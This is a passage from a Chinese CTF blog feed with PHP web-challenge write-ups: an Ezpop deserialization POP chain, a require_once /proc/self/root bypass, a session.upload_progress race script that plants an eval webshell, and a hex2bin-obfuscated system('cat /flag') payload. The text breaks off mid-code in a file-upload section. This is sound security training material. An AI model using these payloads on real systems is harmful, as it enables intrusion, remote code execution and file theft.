        <content type="html"><![CDATA[<h1 id="MRCTF2020-Ezpop-1题解"><a href="#MRCTF2020-Ezpop-1题解" class="headerlink" title="MRCTF2020 Ezpop 1题解"></a>MRCTF2020 Ezpop 1题解</h1><p>做buu做到自己战队出的题，结果还没做出来，感觉可以remake了。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="魔术方法的调用"><a href="#魔术方法的调用" class="headerlink" title="魔术方法的调用"></a>魔术方法的调用</h3><pre class=" language-1"><code class="language-1">__construct 当一个对象创建时被调用，__toString 当一个对象被当作一个字符串被调用。__wakeup() 使用unserialize时触发__get() 用于从不可访问的属性读取数据#难以访问包括：（1）私有属性，（2）没有初始化的属性__invoke() 当脚本尝试将对象调用为函数时触发。</code></pre><h3 id="不同修饰符序列化后的值差异"><a href="#不同修饰符序列化后的值差异" class="headerlink" title="不同修饰符序列化后的值差异"></a>不同修饰符序列化后的值差异</h3><p>当时又忘记这个问题了，导致没做出来，在之前的博客中已经提到过了<br><a href="http://kingkb.top/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb_php_unserialize%E9%A2%98%E8%A7%A3/">http://kingkb.top/2022/01/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb_php_unserialize%E9%A2%98%E8%A7%A3/</a></p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><pre class=" language-php"><code class="language-php">Welcome to index<span class="token punctuation">.</span>php<span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag is in flag.php</span><span class="token comment" spellcheck="true">//WTF IS THIS?</span><span class="token comment" spellcheck="true">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment" spellcheck="true">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>调用了unserialize，跳转到</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>__toString()当一个对象被当作一个字符串被调用，譬如echo一个类的时候就会调用该函数。注意到__wakeup()中有preg_match，我们可以将source的值改为一个类，从而触发__tostring()。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>__get()在用于从不可访问的属性读取数据会被调用，假如我们将Show中str的值改为Test类，那么由于其中没有source，所以会调用__get()会返回一个p()，而__invoke() 当脚本尝试将对象调用为函数时触发，所以我们可以将p的值赋为Modifier。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里面有include，所以可以利用php伪协议读取。<br>最后的payload为</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php";</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>urlencode的原因就是因为不同修饰符序列化后的值差异，而且这种字符是不可见的，用这种方式避免了问题。<br>最后把payload打进去，回显为</p><pre class=" language-1"><code class="language-1">PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezhiMGIzNmU0LTFjYzYtNDcwYi04OWRkLTk1MjZjNTNmNDRkZX0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+解码得到<?phpclass Flag{    private $flag= "flag{8b0b36e4-1cc6-470b-89dd-9526c53f44de}";}echo "Help Me Find FLAG!";?></code></pre><p>得到flag:flag{8b0b36e4-1cc6-470b-89dd-9526c53f44de}<br>参考：<br><a href="https://blog.csdn.net/weixin_45642610/article/details/115919505">https://blog.csdn.net/weixin_45642610/article/details/115919505</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pop 不同修饰符序列化后的值差异 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022Dest0g3 520迎新赛web</title>
      <link href="/2022/05/29/2022Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9Bweb/"/>
      <url>/2022/05/29/2022Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9Bweb/</url>
      
        <content type="html"><![CDATA[<h1 id="2022Dest0g3-520迎新赛web"><a href="#2022Dest0g3-520迎新赛web" class="headerlink" title="2022Dest0g3 520迎新赛web"></a>2022Dest0g3 520迎新赛web</h1><p>周末在赶ddl，后面做了四道，剩下的题下个月争取全部复现。</p><h2 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h2><p>是一道原题WMCTF2020 Make PHP Great Again。<br>参考<a href="https://blog.csdn.net/fmyyy1/article/details/117256082">WMCTF2020 Make PHP Great Again WP</a><br>打开环境，给出源码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">require_once</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>看到require_once第一反应是文件包含类型的题目，尝试多种方法没有试出来。<br>百度找到payload为</p><pre class=" language-1"><code class="language-1">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></pre><p>得到flag。<br>具体原理可见<a href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制 </a><br>还有一种非预期解，利用session.upload_progress文件包含，这里直接粘了博客给的脚本。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'bbbbbbb'</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cmd"</span><span class="token punctuation">:</span><span class="token string">"system('cat flag.php');"</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span> <span class="token string">'http://29990843-ca1b-41bd-b564-78e2b6b86557.node3.buuoj.cn/'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://29990843-ca1b-41bd-b564-78e2b6b86557.node3.buuoj.cn/?file=/tmp/sess_'</span><span class="token operator">+</span>sessid<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'1.txt'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+++++++++++++]retry"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    event<span class="token operator">=</span>threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>启动环境，给出源码。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"fl4g.php"</span><span class="token punctuation">;</span><span class="token variable">$dest0g3</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$timme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$timmme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$time</span> <span class="token operator">></span> <span class="token string">"24"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timme</span> <span class="token operator">></span> <span class="token string">"31"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timmme</span> <span class="token operator">></span> <span class="token string">"60"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Try harder!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_error_handler</span><span class="token punctuation">(</span>    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$fl4g</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">print</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fl4g</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$dest0g3</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>主要关注</p><pre class=" language-php"><code class="language-php"><span class="token function">set_error_handler</span><span class="token punctuation">(</span>    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$fl4g</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">print</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fl4g</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$dest0g3</span><span class="token punctuation">;</span></code></pre><p>set_error_handler函数是在报错时会触发，用于创建运行期间的用户自己的错误处理方法。<br>这题题目就变为了如何触发$fl4g的报错，观察可控变量，发现仅可控制$dest0g3的值，而$dest0g3与$fl4g进行了一次.拼接，于是post<code>ctf[]=""</code>，触发报错，得到flag：Dest0g3{90d18bdb-ecff-4d17-a800-9093f1bd061c}。</p><h2 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h2><p>找到一些进行waf的blog<br><a href="https://blog.csdn.net/qq_51577576/article/details/122481513">https://blog.csdn.net/qq_51577576/article/details/122481513</a><br><a href="https://blog.csdn.net/yuermon/article/details/113445465">https://blog.csdn.net/yuermon/article/details/113445465</a><br><a href="https://blog.csdn.net/Reme_mber/article/details/124416941">https://blog.csdn.net/Reme_mber/article/details/124416941</a><br>最初想用base_convert()，但是无法对一些特殊符号编码。<br>发现可以用hex2bin()进行绕过，ls发现只有index.php，尝试/flag，发现成功读取<br>最后payload为</p><pre class=" language-1"><code class="language-1">aaa=hex2bin('73797374656d')(hex2bin('636174202f2a'));   #解码为：system(cat /*)aaa=hex2bin('73797374656d')(hex2bin('636174202f666c6167'));   #解码为；system(cat /flag)</code></pre><p>得到flag： Dest0g3{a6b1fc53-4007-4a40-a90f-59f5a0ddd287}。</p><h2 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h2><p>搜集到的一些有关资料：<br><a href="https://blog.csdn.net/weixin_43940853/article/details/103749357">https://blog.csdn.net/weixin_43940853/article/details/103749357</a><br><a href="https://blog.csdn.net/weixin_39996141/article/details/111282275">https://blog.csdn.net/weixin_39996141/article/details/111282275</a><br><a href="https://www.cnblogs.com/riginal/p/11314565.html">https://www.cnblogs.com/riginal/p/11314565.html</a><br><a href="https://www.136.la/jingpin/show-122549.html">https://www.136.la/jingpin/show-122549.html</a><br><a href="https://blog.csdn.net/solitudi/article/details/116666720">https://blog.csdn.net/solitudi/article/details/116666720</a><br>首先打开环境，发现前端有JS代码检测后缀</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Checkfiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> fup <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> fileName <span class="token operator">=</span> fup<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">var</span> ext <span class="token operator">=</span> fileName<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>fileName<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ext <span class="token operator">==</span> <span class="token string">"gif"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"GIF"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"JPEG"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"jpeg"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"jpg"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"JPG"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"png"</span> <span class="token operator">||</span> ext <span class="token operator">==</span> <span class="token string">"PNG"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token 